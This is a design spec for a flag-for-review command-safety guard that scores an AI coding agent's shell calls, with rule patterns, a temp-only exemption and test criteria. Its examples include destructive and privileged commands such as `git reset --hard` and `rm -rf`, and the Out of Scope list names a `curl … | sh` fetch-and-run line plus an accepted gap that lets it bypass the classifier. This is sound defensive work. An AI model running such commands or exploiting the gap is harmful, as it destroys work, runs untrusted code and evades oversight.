# SPEC: Command-safety guard (P5 A-mode)

## Summary

Promote the P5 command-safety classifier from shadow-only to a flag-for-review guard. When `execution.commandSafety.guard` is configured, an agent-authored `Bash` or `Exec` call that the permission policy already allowed is scored with the rule-or-mean scorer (the deterministic rule hits combined with the classifier's answers). A call whose score reaches the threshold (default `0.75`) is turned into an ask and resolved by the run's existing ask resolver. With no approval channel, that means it is refused. The guard only narrows: it never turns a deny or an ask into an allow. The feature also adds four deterministic `discards_work` rule patterns and a temp-only exemption that applies when the sandbox confines temp writes. It also fixes `detectTmpWrite`, which over-exempts any `/tmp/nax-*` path.

## Motivation

P5 shipped the classifier as a shadow that decides nothing (master plan D4a: a model is a flag-for-review guardrail, never an auto-approver). The promotion ratchet required a labelled corpus and a threshold ruling before going live. Both now exist:

- 4,470 labelled shadow commands (snapshot v1) were scored in `projects/nax/p5-labels-eval-2026-09-28/`, then re-scored for tmp confinement (#2285) in `projects/nax/p5-labels-rescore-2026-09-29/README.md`.
- **Ruling (2026-09-29): scorer ruleOrMean, 2% false-positive budget, threshold 0.752**, rounded to a default of `0.75`. The threshold is unchanged by confinement. Catch rises from 0.46 to 0.51-0.65 when temp-only commands are exempted. That exemption is what this spec adds, as a no-ask filter.
- The rule scorer misses 11 of the 22 labelled `discards_work` commands. Every miss has one of two shapes: `git checkout <path>` without `--`, and `git restore <path>`. Four new patterns catch all 11, add 0 hits on the other 4,459 labels, and add 20 hits on 8,291 live rows, all of them real discards.
- `detectTmpWrite` exempts every `/tmp/nax-*` path as "nax's own", but only `/tmp/nax/<runId>` and the per-user fallback `/tmp/nax-<uid>` are nax's own after #2285. A write to `/tmp/nax-red-check` is denied by the confined sandbox yet not flagged.

## Design

### Integration

The baselines below exist only to locate the code. The **Target** is the interface to implement.

Symbols this feature changes:

- `RULE_SET_VERSION` — `src/command-safety/rule-scorer.ts:26`. Baseline: `2`. Target: `3`.
- `RULES.discards_work` — `src/command-safety/rule-scorer.ts:35-47`. Baseline: 11 patterns. Target: the same 11 plus four patterns, each matched within one shell segment (never across `;`, `&` or `|`):
  1. `git checkout` followed only by non-flag words, at least one of which ends in `/` or ends in a dot plus a letter-led extension (`src/a.ts`, `scripts/baselines/`). A branch name such as `main`, `feature/x` or `release/v0.82.1`, and a tag such as `v0.83.0`, is not matched.
  2. `git restore` with at least one non-flag word and no `--staged` or `-S` flag in the segment.
  3. `git restore` with `--worktree` or `-W` in the segment, even when `--staged` is also present.
  4. `git checkout` or `git switch` with `-f`, `--force` or `--discard-changes` in the segment.
- `isNaxTempTree(path, root)` (private) — `src/command-safety/tmp-write.ts:66`. Baseline: exempts `<root>/nax/…` and any path starting with `<root>/nax-`. Target: exempts `<root>/nax/…` and `<root>/nax-<digits>` where the digits are the whole path segment (the per-user fallback `/tmp/nax-<uid>`), and nothing else.
- `CommandSafetyConfigSchema` — `src/config/schemas-command-safety.ts:46`. Baseline: `{ shadow?: CommandSafetyShadow }`. Target: `{ shadow?: CommandSafetyShadow; guard?: { threshold: number } }`, where `threshold` is a number greater than `0` and at most `1`, defaulting to `0.75`. A `guard` without a `shadow` fails validation with the message `commandSafety.guard requires commandSafety.shadow (the guard reuses its classifier)`.
- `CommandShadow` — `src/command-safety/types.ts:89`. Baseline: `{ observe; settle; drain }`. Target: the same three members plus `readonly guard?: CommandGuard`, present only when the shadow was created with a guard option.
- `CommandShadowOptions` — `src/command-safety/shadow.ts:25`. Target: add `readonly guard?: { readonly threshold: number }`.
- `BuildCommandShadowOptions.config` — `src/command-safety/build.ts:18`. Target: the structural type also carries `guard?: { threshold: number }`, and `buildCommandShadow` forwards it to `createCommandShadow` as the `guard` option.
- `createCodingToolRuntime(opts)` — `src/tools/runtime.ts:122`. Target: add `tempConfined?: boolean` (absent reads as `false`). `callTool` consults `opts.commandShadow?.guard` after `policy.check` returns an allowed verdict, and before `runTool`. The check is on the **policy identity** from `resolvePolicyIdentity`: `Bash`, or `Exec`, which is what a `RunCommand` call carrying `argv` resolves to. `Exec` itself is a capability marker, not a registered tool (`src/agents/coding-tool-support.ts:178-184`).
- `buildCodingToolSupport(args)` — `src/agents/coding-tool-support.ts:63`. Target: passes `tempConfined: isTempConfined(args.launcher)` to `createCodingToolRuntime`. The check lives in a helper because `buildCodingToolSupport` sits exactly at its complexity baseline (`scripts/baselines/complexity-baseline.json`, 38), and `check:complexity` rejects any growth.
- New `isTempConfined(launcher: CommandLauncher | undefined): boolean` — exported from `src/agents/coding-tool-sandbox.ts`. It returns `true` exactly when `launcher?.state.kind === "available"` and `launcher.state.sharedTmp === false`.

New symbols (`src/command-safety/`, exported from the `@/command-safety` barrel):

```typescript
export interface GuardInput {
  readonly command: string;            // policy identity Bash: the command string; Exec (a RunCommand argv call): argv joined with single spaces
  readonly cwd?: string;               // the policy root
  readonly tempConfined: boolean;      // the session's sandbox confines temp writes (#2285)
}

export interface GuardDecision {
  readonly flagged: boolean;
  readonly score: number;              // 0..1
  readonly threshold: number;
  readonly basis: "model" | "rules" | "temp-only";
  readonly category?: QuestionId;      // present when flagged and a category is known
}

export interface CommandGuard {
  readonly threshold: number;
  /** Total: never rejects. */
  assess(input: GuardInput): Promise<GuardDecision>;
}

/** src/command-safety/guard.ts — pure; the shadow awaits classifyCached and passes the ModelResult in.
 *  `model` is undefined when the temp-only check skipped the classifier. */
export function scoreGuard(input: {
  readonly rules: RuleResult;
  readonly model: ModelResult | undefined;
  readonly tempOnly: boolean;
  readonly threshold: number;
}): GuardDecision;

/** src/command-safety/temp-only.ts */
export function isTempOnly(command: string, cwd: string | undefined): boolean;
```

Symbols this feature only reads:

- `scoreRules(command, { root })` — `src/command-safety/rule-scorer.ts:134`.
- `FIELD_DESCRIPTIONS` — `src/cli/config-descriptions.ts:132-137` holds one description per `execution.commandSafety` key; `test/unit/cli/config-descriptions.test.ts:135-146` requires one for every key in the schema, so the two new keys need entries.
- `classifyCached` (private closure in `createCommandShadow`, `src/command-safety/shadow.ts:80`) is the per-story cache keyed on `shadowCacheKey(command)`. The guard reads the same cache, so one command is classified once whether the shadow row, the guard, or both ask for it.
- `lexBashCommand(command)` — `src/permissions/bash-lex.ts:104`, exported from `@/permissions`. It returns `{ kind: "ok", segments }` or a refusal with a `prefix`; `BashToken` carries `text` and `opaque`.
- `resolveAskOutcome(p)` — `src/tools/runtime-calltool.ts:136`, unchanged. It builds the `AskRequest` with `rule: verdict.rule ?? verdict.reason` and `matchedRule: verdict.rule`, then runs the tool on `allow` or returns `denied` with `${verdict.reason} -- ${askDenyReason(decidedBy)}`.
- `headlessAskResolver()` and `ASK_NO_CHANNEL_REASON` — `src/permissions/ask.ts`, unchanged. An unattended run's resolver denies every ask.
- `openCallShadowTap` — `src/tools/runtime-calltool.ts:97`, unchanged. It is opened before the guard runs, so the shadow's `observe` starts the classification the guard then awaits.
- `buildDispatchAskWiring` — `src/interaction/dispatch-ask.ts:104`, unchanged. It already passes `config.execution?.commandSafety` whole to `buildCommandShadow`.

### Approach

**Guard scoring (`assess`).** The composition is an ordered pipeline:

1. **Temp-only check.** If `tempConfined` is true and `isTempOnly(command, cwd)` is true, the guard does not consult the classifier. The shadow row, opened first, still classifies the command. The score is `1` if any rule category **other than `outside_project`** hits, and `0` otherwise. The basis is `"temp-only"`.
2. **Rules.** `ruleScore` is `1` when any of the six rule categories hits, else `0`.
3. **Model.** Await the cached classification.
   - `answered`: `harm = 1 - P(none)`, `noulMax = max P(yes)` over the six noul questions, `modelScore = (harm + noulMax) / 2`. The score is `max(ruleScore, modelScore)` and the basis is `"model"`.
   - `blocked`: the score is `1` and the basis is `"model"`.
   - `oversize` or `unavailable` (timeout, transport error, classifier threw): the score is `ruleScore` and the basis is `"rules"`.
4. **Flag.** `flagged = score >= threshold`.
5. **Category.** When a rule hits, the category is the first hit in `QUESTION_IDS` order, skipping `outside_project` when the temp-only check applied. Otherwise, for an answered model, it is the harm option other than `none` with the highest probability (ties go to `QUESTION_IDS` order). It is absent for a `blocked` result with no rule hit, and for an unflagged decision.

This is the scorer measured in `p5-labels-rescore-2026-09-29` as `ruleOrMean`, with the exemption measured as `tmpOnly`. One deliberate difference: a temp-only command that trips a non-`outside_project` rule (e.g. `rm -rf /tmp/x` hits `deletes_data`) still flags.

**Temp-only predicate (`isTempOnly`).** Lex the command with `lexBashCommand`. A refused lex, or an undefined `cwd`, returns `false`. Walk the segments, tracking the working directory through `cd` the same way `detectTmpWrite` does, with one difference: a `cd` whose target cannot be resolved (an opaque word or a `~` path) makes the working directory unknown, and any later relative path-like token then returns `false`. A token is **path-like** when it contains `/`, equals `.` or `..`, or starts with `~`. For a `--flag=value` token, the value is judged instead. Every path-like token, and every redirect target, must resolve to one of:

- a path under a temp root (`/tmp`, `/private/tmp`);
- an opaque word that is exactly `$TMPDIR` or `${TMPDIR}`, or one of them followed by `/` and a remainder with no `..` segment;
- a path under `cwd`;
- `/dev/null`, `/dev/stdout` or `/dev/stderr`.

Any other path-like token returns `false`. That includes a `~` path, any other opaque word containing `/`, and a relative path that climbs out of `cwd`. Two token shapes cannot be judged and also return `false`: a token that starts with `-` and contains `/` but is not of the `--flag=value` form (an attached short-option value such as `-C/etc`), and any token containing `://` (a URL). The result is `true` only when at least one token or redirect target was a temp path.

**Runtime wiring.** In `callTool`, when the verdict is allowed, the policy identity is `Bash` or `Exec`, and `opts.commandShadow?.guard` exists, await `guard.assess({ command, cwd: policy.root, tempConfined })`. On `flagged`, synthesise a denied verdict:

```typescript
{ allowed: false, outcome: "ask", breach: false, rule: "command-safety",
  reason: `flagged for review by command safety: ${category ?? "blocked"} (score ${score.toFixed(2)} >= ${threshold})`,
  resolvedPaths: verdict.resolvedPaths }
```

Hand it to the existing `resolveAskOutcome`. When not flagged, call `runTool` as today. The helper that does this lives in `src/tools/runtime-calltool.ts`, so `runtime.ts` (479 lines) grows by only the call site.

Comments that the feature makes false are updated in the same stories. US-001 owns the `/tmp/nax-*` wording in `tmp-write.ts` and `types.ts` (the `signals.tmpWrite` doc). US-003 owns the "never a gate" header of `rule-scorer.ts`, the "Observational only" header of `types.ts`, and the `execution.commandSafety` description, which becomes "Command classifier: shadow rows, plus the optional flag-for-review guard".

### Failure Handling

| Case | Behaviour |
|:---|:---|
| Classifier unavailable, timed out, or threw | Rules-only decision, basis `"rules"` (US-003) |
| Command oversize for the classifier | Rules-only decision, basis `"rules"` (US-003) |
| Classifier returns `blocked` | Score `1`, flagged (US-003) |
| Flagged in a run with no approval channel | The headless resolver denies. The call is refused with the no-channel reason, and the tool never runs (US-004) |
| `guard.assess` rejects despite its contract | The call is treated as not flagged and runs. `getSafeLogger()?.warn("command-safety", "Command-safety guard failed; the call runs unguarded", { error })` is logged once per rejecting call, the same logger `build.ts` uses (US-004) |
| `commandSafety.guard` configured without `commandSafety.shadow` | Config validation fails with `commandSafety.guard requires commandSafety.shadow (the guard reuses its classifier)` (US-003) |
| `isTempOnly` given a command the lexer refuses (e.g. a heredoc) | Returns `false`, so the normal model path applies (US-002) |

## Out of Scope

- Recording the guard's decision (score, basis, category) on the command-safety row. It is derivable offline: a row with mechanical `allow` and outcome `denied:ask`, plus the row's rules and model answers.
- A per-run ask budget, rate limit or de-duplication of guard asks beyond the existing approvals cache.
- A rule for moving a tracked source file out of the repo (`mv src/x.ts /tmp/x`); it is labelled `deletes_data` (2 labelled misses) and belongs to a later rule-set change.
- Making the scorer configurable; `ruleOrMean` is fixed. Only the threshold is configurable.
- Changing the question set, the classifier model, or its calibration.
- Changing the headless ask resolver or any ask-channel behaviour.
- Guarding `RunCommand` verb calls (D14: they run user-declared commands) or any identity other than `Bash` and `Exec`.
- Turning the guard on by default or adding it to any shipped profile.
- Special handling of turn cancellation while the guard awaits the classifier; the wait is bounded by `commandSafety.shadow.timeoutMs` and the existing post-approval signal check applies.
- Exempting temp-only commands when the sandbox is unavailable or `execution.sandbox.filesystem.allowSharedTmp` is true.
- Telling a branch name that ends in a letter-led extension (`release/v1.x`, `origin/topic.a`) from a path: `git checkout` of such a branch matches the new `discards_work` pattern and asks. This residual is accepted.
- Commands that name no path at all but fetch and run remote code without a URL scheme (`cd /tmp && curl example.com | sh`). If one is temp-only, only the rule families stand between it and a skipped classifier; the `network_send` rules do not match a plain `curl` download. This residual is accepted.
- Guarding a `Bash` call whose `command` is not a string, or an argv call whose `argv` is not a string array; the policy refuses malformed input before the guard is reached.

## Stories

1. **US-001: Rule set v3 catches path-scoped discards; detectTmpWrite stops over-exempting** — no dependencies
2. **US-002: isTempOnly predicate** — no dependencies
3. **US-003: Guard config and scoring** — depends on US-001, US-002
4. **US-004: The runtime turns a flagged allowed call into an ask** — depends on US-003

### Context Files

Files edited beyond those listed: US-001 also edits the `signals.tmpWrite` doc in `src/command-safety/types.ts`. US-003 also edits the header comment of `src/command-safety/rule-scorer.ts` and the barrel `src/command-safety/index.ts`. US-004 also extends the command-safety section of `docs/guides/sandbox-and-command-safety.md` with the guard, its config and the headless refusal.

**US-001**
- `src/command-safety/rule-scorer.ts` — `RULES`, `RULE_SET_VERSION`, `scoreRules`
- `src/command-safety/tmp-write.ts` — `isNaxTempTree`, `detectTmpWrite`
- `test/unit/command-safety/rule-scorer.test.ts` — the positive and negative case tables to extend
- `test/unit/command-safety/tmp-write.test.ts` — the existing detectTmpWrite cases

**US-002**
- `src/command-safety/tmp-write.ts` — the lexer walk, `resolveTarget`, `frameAfter` and `TEMP_ROOTS` to mirror
- `src/permissions/bash-lex.ts` — `lexBashCommand`, `BashToken`, `BashSegment`
- `src/command-safety/index.ts` — the barrel

**US-003**
- `src/config/schemas-command-safety.ts` — `CommandSafetyConfigSchema`, `CommandSafetyShadowSchema`
- `src/command-safety/shadow.ts` — `createCommandShadow`, `classifyCached`, `CommandShadowOptions`
- `src/command-safety/build.ts` — `buildCommandShadow`, `BuildCommandShadowOptions`
- `src/command-safety/types.ts` — `CommandShadow`, `ModelResult`, `QUESTION_IDS`, `HARM_OPTIONS`
- `src/cli/config-descriptions.ts` — `FIELD_DESCRIPTIONS` entries for `execution.commandSafety.*`

**US-004**
- `src/tools/runtime.ts` — `createCodingToolRuntime`, `callTool`
- `src/tools/runtime-calltool.ts` — `resolveAskOutcome`, `openCallShadowTap`, `resolvePolicyIdentity`
- `src/agents/coding-tool-support.ts` — `buildCodingToolSupport`, `args.launcher`
- `test/unit/agents/coding-tool-support-sandbox-wrapped.test.ts` — the `stubLauncher` and raw-Bash `buildCodingToolSupport` fixture
- `src/agents/coding-tool-sandbox.ts` — `rawScreenOptionsFor`, the launcher state; `isTempConfined` goes here

### Creates

**US-001**
- None; the new cases extend the two existing test files.

**US-002**
- `src/command-safety/temp-only.ts` — `isTempOnly`
- `test/unit/command-safety/temp-only.test.ts` — the predicate tests

**US-003**
- `src/command-safety/guard.ts` — the pure scoring function the shadow's `guard.assess` calls
- `test/unit/command-safety/guard.test.ts` — the scoring tests
- `test/unit/config/command-safety-guard-config.test.ts` — the schema tests

**US-004**
- `test/unit/tools/runtime-command-guard.test.ts` — the runtime tests
- `test/unit/agents/coding-tool-support-temp-confined.test.ts` — the `tempConfined` threading tests

### Modifies

**US-001**
- `test/unit/command-safety/rule-scorer.test.ts` — the test "version is 2 and every category is reported" asserts `RULE_SET_VERSION` is `2`. The rule set gains four `discards_work` patterns, which bumps it to `3`, so the assertion becomes `3`; the category-list assertion is unchanged.
- `test/unit/command-safety/tmp-write.test.ts` — the test "US-005 AC7: nax's own /tmp/nax-* run directory is not counted" asserts that a write into the legacy run directory tmp/nax-r1 is not counted. Since #2285 no run directory has that layout: nax's own temp trees are tmp/nax/(runId) and the all-digit per-user fallback tmp/nax-(uid), and the confined sandbox denies writes to any other tmp/nax-(name) directory. The assertion becomes: a write to the same file under tmp/nax/r1 (the shared parent) is not counted.

### Seams

- US-001 → US-003: `assess` scores through `scoreRules` at rule-set v3, observed by a `git checkout src/a.ts` command flagging with category `discards_work` while the classifier is unavailable.
- US-002 → US-003: `assess` calls `isTempOnly`, observed by a confined temp-only command skipping the classifier.
- US-003 → US-004: `callTool` consults `commandShadow.guard`, observed through the ask resolver being invoked with rule `command-safety` for a `Bash` call entered at `runtime.callTool`.
- US-003 config → shadow: `buildDispatchAskWiring` → `buildCommandShadow` → `createCommandShadow` with the guard option, observed by `wiring.commandShadow.guard.threshold`.
- US-004: `buildCodingToolSupport` → `isTempConfined(launcher)` → `createCodingToolRuntime({ tempConfined })`, observed by the argument `guard.assess` receives for a `Bash` call.

## Acceptance Criteria

The guard fixture used by US-003 and US-004 is `createCommandShadow` with:

- a stub `classify` that records every command it receives and returns a configurable `ModelResult`;
- a no-op `write`;
- `runId` `"r1"`, `timeoutMs` `1000`, and `guard: { threshold: 0.75 }`.

The "high" answer is `answered`: the harm choice gives `none` `0.1`, `discards_work` `0.6` and each of the other five categories `0.06`, and every noul `P(yes)` is `0.9`. Its score is `((1 - 0.1) + 0.9) / 2 = 0.9`. The "low" answer is `answered`: the harm choice gives `none` `0.94` and each of the six categories `0.01`, and every noul `P(yes)` is `0.05`. Its score is `(0.06 + 0.05) / 2 = 0.055`.

### US-001

1. `[unit]` `scoreRules("git checkout src/cli/approvals.ts").hits.discards_work` is `true`.
2. `[unit]` `scoreRules("git checkout scripts/baselines/").hits.discards_work` is `true`.
3. `[unit]` `scoreRules("git checkout HEAD src/index.ts").hits.discards_work` is `true`.
4. `[unit]` `scoreRules("bun test && git checkout docs/guides/cli-reference.md").hits.discards_work` is `true`.
5. `[unit]` `scoreRules("git restore test/unit/config/schemas-review.test.ts").hits.discards_work` is `true`.
6. `[unit]` `scoreRules("git restore --staged --worktree src/a.ts").hits.discards_work` is `true`.
7. `[unit]` `scoreRules("git restore --staged src/a.ts").hits.discards_work` is `false`.
8. `[unit]` `scoreRules("git restore -S src/a.ts").hits.discards_work` is `false`.
9. `[unit]` `scoreRules("git checkout -f main").hits.discards_work` is `true`.
10. `[unit]` `scoreRules("git switch --discard-changes main").hits.discards_work` is `true`.
11. `[unit]` `scoreRules(c).hits.discards_work` is `false` for each of `git checkout main`, `git checkout feature/x`, `git checkout -b feature/new`, `git checkout release/v0.82.1` and `git checkout v0.83.0`.
12. `[unit]` `scoreRules("git checkout main; ls src/").hits.discards_work` is `false`; a path in a later segment does not make an earlier branch checkout a discard.
13. `[unit]` `scoreRules("git restore src/a.ts; git diff --staged").hits.discards_work` is `true`; a `--staged` in a later segment does not suppress the restore.
14. `[unit]` `RULE_SET_VERSION` equals `3`, and `scoreRules("ls").version` equals `3`.
15. `[unit]` `detectTmpWrite("echo x > /tmp/nax-red-check/a.txt")` returns `true`.
16. `[unit]` `detectTmpWrite("cp a.txt /private/tmp/nax-scratch/a.txt")` returns `true`.
17. `[unit]` `detectTmpWrite("echo x > /tmp/nax-501/r1/a.txt")` returns `false`; a numeric per-user fallback root stays exempt.
18. `[unit]` `detectTmpWrite("echo x > /tmp/nax/r1/a.txt")` returns `false`.
19. `[unit]` `detectTmpWrite("echo x > /tmp/nax-501x/a.txt")` returns `true`; the fallback segment must be all digits.

### US-002

1. `[unit]` `isTempOnly("cp src/a.ts /tmp/a.bak", "/repo/proj")`, imported from the `@/command-safety` barrel, returns `true`.
2. `[unit]` `isTempOnly("cat /tmp/out.txt", "/repo/proj")` returns `true`; a temp read counts.
3. `[unit]` `isTempOnly("echo x > $TMPDIR/a.txt", "/repo/proj")` returns `true`.
4. `[unit]` `isTempOnly("cd /tmp/work && git init", "/repo/proj")` returns `true`.
5. `[unit]` `isTempOnly("cat /private/tmp/x.log", "/repo/proj")` returns `true`.
6. `[unit]` `isTempOnly("bun build --outdir=/tmp/b src/a.ts", "/repo/proj")` returns `true`; a `--flag=value` token is judged by its value.
7. `[unit]` `isTempOnly("cat /repo/proj/src/a.ts > /tmp/x", "/repo/proj")` returns `true`; a path under `cwd` is allowed.
8. `[unit]` `isTempOnly("echo x > /dev/null; cp a.txt /tmp/b", "/repo/proj")` returns `true`.
9. `[unit]` `isTempOnly("ls src", "/repo/proj")` returns `false`; no temp path appears.
10. `[unit]` `isTempOnly("cp /tmp/a ~/b", "/repo/proj")` returns `false`.
11. `[unit]` `isTempOnly("cat /tmp/a ../other/b", "/repo/proj")` returns `false`; the relative path resolves outside `cwd`.
12. `[unit]` `isTempOnly("cat /etc/hosts > /tmp/x", "/repo/proj")` returns `false`.
13. `[unit]` `isTempOnly("cp a.txt $OUT/x", "/repo/proj")` returns `false`; an opaque path word other than `$TMPDIR` cannot be judged.
14. `[unit]` `isTempOnly("cat > /tmp/a.txt << 'EOF'\nx\nEOF", "/repo/proj")` returns `false`; the lexer refuses the heredoc.
15. `[unit]` `isTempOnly("cp a.txt /tmp/b", undefined)` returns `false`.
16. `[unit]` `isTempOnly("tar -C/etc -xf /tmp/a.tar", "/repo/proj")` returns `false`; an attached short-option value containing `/` cannot be judged.
17. `[unit]` `isTempOnly("curl https://example.com/x -o /tmp/x", "/repo/proj")` returns `false`; a URL token cannot be judged.
18. `[unit]` `isTempOnly("cat $TMPDIR/../../etc/x", "/repo/proj")` returns `false`.
19. `[unit]` `isTempOnly("cat $TMPDIRX/a", "/repo/proj")` returns `false`.
20. `[unit]` `isTempOnly("cd $D && cp a/b /tmp/x", "/repo/proj")` returns `false`; after an unresolvable `cd` a relative path cannot be judged.

### US-003

1. `[unit]` `CommandSafetyConfigSchema.parse({ shadow: { url: "http://127.0.0.1:8020/x" }, guard: {} }).guard.threshold` equals `0.75`.
2. `[unit]` `CommandSafetyConfigSchema.safeParse({ guard: { threshold: 0.6 } })` fails with an issue whose message is `commandSafety.guard requires commandSafety.shadow (the guard reuses its classifier)`.
3. `[unit]` `CommandSafetyConfigSchema.safeParse({ shadow: { url: "http://127.0.0.1:8020/x" }, guard: { threshold: 1.5 } })` fails.
4. `[unit]` `CommandSafetyConfigSchema.safeParse({ shadow: { url: "http://127.0.0.1:8020/x" }, guard: { threshold: 0 } })` fails; the threshold must be greater than `0`.
5. `[unit]` `FIELD_DESCRIPTIONS["execution.commandSafety.guard"]` and `FIELD_DESCRIPTIONS["execution.commandSafety.guard.threshold"]` are both non-empty strings.
6. `[unit]` `CommandSafetyConfigSchema.parse({ shadow: { url: "http://127.0.0.1:8020/x" } }).guard` is `undefined`.
7. `[unit]` `buildCommandShadow` with a config holding `shadow` and no `guard` returns a shadow whose `guard` is `undefined`.
8. `[integration]` `buildDispatchAskWiring` with a config whose `execution.commandSafety` is `{ shadow: { url: "http://127.0.0.1:8020/x", timeoutMs: 3000, authEnv: "NAX_COMMAND_SAFETY_AUTH", allowRemote: false }, guard: { threshold: 0.6 } }` returns a wiring whose `commandShadow.guard.threshold` equals `0.6`.
9. `[unit]` In the guard fixture with the "high" answer, `guard.assess({ command: "ls", cwd: "/repo/proj", tempConfined: false })` resolves to `flagged: true`, `basis: "model"`, a `score` of `0.9` within `1e-9`, and `category: "discards_work"`.
10. `[unit]` In the guard fixture with the "low" answer, `guard.assess({ command: "ls", cwd: "/repo/proj", tempConfined: false })` resolves to `flagged: false` and `basis: "model"`.
11. `[unit]` In the guard fixture with the "low" answer, `guard.assess({ command: "git reset --hard", cwd: "/repo/proj", tempConfined: false })` resolves to `flagged: true`, `score: 1`, `basis: "model"` and `category: "discards_work"`, because a rule hit scores `1`.
12. `[unit]` In the guard fixture with the classifier returning `{ status: "unavailable", error: "timeout" }`, `guard.assess({ command: "git checkout src/a.ts", cwd: "/repo/proj", tempConfined: false })` resolves to `flagged: true`, `basis: "rules"` and `category: "discards_work"`.
13. `[unit]` In the guard fixture with the classifier returning `{ status: "unavailable", error: "timeout" }`, `guard.assess({ command: "ls", cwd: "/repo/proj", tempConfined: false })` resolves to `flagged: false`, `score: 0` and `basis: "rules"`.
14. `[unit]` In the guard fixture with the classifier returning `{ status: "oversize", latencyMs: 1 }`, `guard.assess({ command: "ls", cwd: "/repo/proj", tempConfined: false })` resolves to `flagged: false` and `basis: "rules"`.
15. `[unit]` In the guard fixture with the classifier returning `{ status: "blocked", latencyMs: 1 }`, `guard.assess({ command: "ls", cwd: "/repo/proj", tempConfined: false })` resolves to `flagged: true`, `score: 1`, `basis: "model"`, and no `category`.
16. `[unit]` In the guard fixture with a `classify` that throws synchronously, `guard.assess({ command: "ls", cwd: "/repo/proj", tempConfined: false })` resolves (does not reject) to `flagged: false` and `basis: "rules"`.
17. `[unit]` In the guard fixture with the "high" answer, `guard.assess({ command: "cp src/a.ts /tmp/a.bak", cwd: "/repo/proj", tempConfined: true })` resolves to `flagged: false` and `basis: "temp-only"`, and the stub `classify` records no call.
18. `[unit]` In the guard fixture with the "low" answer, `guard.assess({ command: "rm -rf /tmp/x", cwd: "/repo/proj", tempConfined: true })` resolves to `flagged: true`, `basis: "temp-only"` and `category: "deletes_data"`.
19. `[unit]` In the guard fixture with the "high" answer, `guard.assess({ command: "cp src/a.ts /tmp/a.bak", cwd: "/repo/proj", tempConfined: false })` resolves to `basis: "model"`, and the stub `classify` records the command once.
20. `[unit]` In the guard fixture with the "low" answer, calling `observe` for command `bun run test` and then `guard.assess({ command: "bun run test", cwd: "/repo/proj", tempConfined: false })` leaves the stub `classify` with exactly one recorded call.
21. `[unit]` In the guard fixture with `guard: { threshold: 0.5 }` and an `answered` result whose harm choice gives `none` `0.5` and `deletes_data` `0.5`, and whose every noul `P(yes)` is `0.5`, `guard.assess({ command: "ls", cwd: "/repo/proj", tempConfined: false })` resolves to `flagged: true`; a score equal to the threshold flags.
22. `[unit]` `createCommandShadow` called without a `guard` option returns a shadow whose `guard` is `undefined`.
23. `[unit]` In the guard fixture with the classifier returning `{ status: "unavailable", error: "timeout" }`, `guard.assess({ command: "sudo git reset --hard", cwd: "/repo/proj", tempConfined: false })` resolves to `category: "discards_work"`; with both `discards_work` and `privilege` hitting, the first in `QUESTION_IDS` order wins.

### US-004

The runtime fixture for US-004: `createCodingToolRuntime` with `extraTools` holding a recording stub tool named `Bash`. The stub has the real Bash tool's `scope`, records every `run`, and returns `{ content: "ok" }`; runtime lookups consult `extraTools` first. The `commandShadow` is `{ observe, settle, drain }` as no-ops, plus the stated `guard`. "The Bash tool never runs" means the stub recorded no run, and "runs the Bash tool" means it recorded exactly one.

1. `[integration]` A runtime from `createCodingToolRuntime` with a Bash-allowing policy, no `askResolver`, and a `commandShadow` whose `guard.assess` resolves `{ flagged: true, score: 0.9, threshold: 0.75, basis: "model", category: "discards_work" }`, called with `callTool("Bash", { command: "git checkout src/a.ts" })`, returns `kind: "denied"` with a reason containing `flagged for review by command safety: discards_work (score 0.90 >= 0.75)` and `no approval channel is configured`, and the Bash tool never runs.
2. `[integration]` The same runtime with an `askResolver` stub whose `resolve` returns `{ decision: "allow", decidedBy: "test", latencyMs: 1 }` runs the Bash tool, returns `kind: "ok"`, and the stub records one request whose `rule` is `command-safety` and whose `command` is `git checkout src/a.ts`.
3. `[integration]` The same runtime with an `askResolver` stub that returns `{ decision: "deny", decidedBy: "human", latencyMs: 1 }` returns `kind: "denied"`, and the Bash tool never runs.
4. `[integration]` A runtime whose `guard.assess` resolves `flagged: false` runs the Bash tool for `callTool("Bash", { command: "ls" })`, returns `kind: "ok"`, and its `askResolver` stub records no request.
5. `[integration]` A runtime whose policy denies Bash never calls `guard.assess` for `callTool("Bash", { command: "ls" })`.
6. `[integration]` A runtime whose policy returns an ask verdict for Bash never calls `guard.assess`, and its `askResolver` stub records exactly one request whose `rule` is not `command-safety`.
7. `[integration]` A runtime with a stub guard never calls `guard.assess` for an allowed `callTool("Read", { path: "a.txt" })`.
8. `[integration]` A runtime whose `commandShadow` has no `guard` runs an allowed `callTool("Bash", { command: "ls" })` and returns `kind: "ok"`.
9. `[integration]` A runtime created with `tempConfined: true` and root `/repo/proj` calls `guard.assess` with `{ command: "ls", cwd: "/repo/proj", tempConfined: true }` for `callTool("Bash", { command: "ls" })`.
10. `[integration]` A runtime created without `tempConfined` calls `guard.assess` with `tempConfined: false`.
11. `[integration]` A runtime with the guard fixture's real `createCommandShadow`, the "low" answer, and the headless resolver, called with `callTool("Bash", { command: "git checkout src/a.ts" })`, returns `kind: "denied"`, and the stub `classify` records the command exactly once.
12. `[integration]` A runtime whose `guard.assess` rejects with `new Error("boom")` runs the Bash tool for `callTool("Bash", { command: "ls" })` and returns `kind: "ok"`, and the logger returned by `getSafeLogger()` records exactly one `warn` with stage `command-safety` and message `Command-safety guard failed; the call runs unguarded`.
13. `[integration]` A runtime from `createCodingToolRuntime` with policy `compileToolPolicy([{ tool: "Exec", patterns: ["*"] }], "/repo")`, `extraTools` holding `createRunCommandTool(new Map(), { exec })` (the `run-command-exec.test.ts` fixture), no `askResolver`, and a guard that flags, called with `callTool("RunCommand", { argv: ["git", "checkout", "src/a.ts"] })`, passes `command: "git checkout src/a.ts"` to `guard.assess` and returns `kind: "denied"`.
The `buildCodingToolSupport` fixture for the next three criteria is `{ root, declared: ["Bash"], grants: [{ tool: "Bash", patterns: ["*"] }], bashApproval: "raw", launcher, commandShadow }`, where `launcher` is the recording stub from `coding-tool-support-sandbox-wrapped.test.ts` (it has `state` and a `run` that records and returns exit code 0) and `commandShadow` carries a guard whose `assess` records its input and resolves `flagged: false`.

14. `[integration]` `buildCodingToolSupport` given a `launcher` whose `state` is `{ kind: "available", backend: "srt", network: "open", sharedTmp: false }` and a `commandShadow` with a recording guard, then `callTool("Bash", { command: "ls" })` on its runtime, records a `guard.assess` input with `tempConfined: true`.
15. `[integration]` `buildCodingToolSupport` given a `launcher` whose `state` is `{ kind: "available", backend: "srt", network: "open" }` (no `sharedTmp`) records a `guard.assess` input with `tempConfined: false`.
16. `[integration]` `buildCodingToolSupport` given a `launcher` whose `state` is `DISABLED_SANDBOX_STATE` (from `@/sandbox`) records a `guard.assess` input with `tempConfined: false`.
